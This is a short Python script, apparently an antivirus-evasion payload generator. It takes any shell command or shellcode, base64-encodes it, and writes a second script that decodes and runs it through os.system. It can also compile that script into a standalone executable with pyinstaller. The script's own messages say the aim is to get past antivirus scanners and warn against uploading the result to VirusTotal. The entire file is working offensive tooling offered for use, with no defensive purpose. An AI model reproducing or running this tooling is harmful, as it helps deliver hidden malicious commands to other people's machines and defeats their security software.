#!/bin/python3.9
import os
import base64

print("\nEnter shellcodes or other commands")
print("\nto generate a payload that should")
print("\nget past some antivirus scanners.")
print("\nDo not upload to Virus Total.")

payload = input("\nEnter command: ")
payload_bytes = payload.encode('utf-8')
payload_encoded = base64.b64encode(payload_bytes)
text = f'''
#!/bin/python3.9
import os
import base64

payload = {payload_encoded}

execute = base64.b64decode(payload)
payload_decoded = execute.decode('utf-8')
os.system(payload_decoded)
'''
with open("payload.py", "w") as thepayload:
    thepayload.write(text)
    print("Payload Generated!!")

cont = input("Would you like to compile an executable? (y/n) ")
if cont == "y":
    os.system("pyinstaller --onefile payload.py")
elif cont == "n":
    print("Closing down... ")
exit()
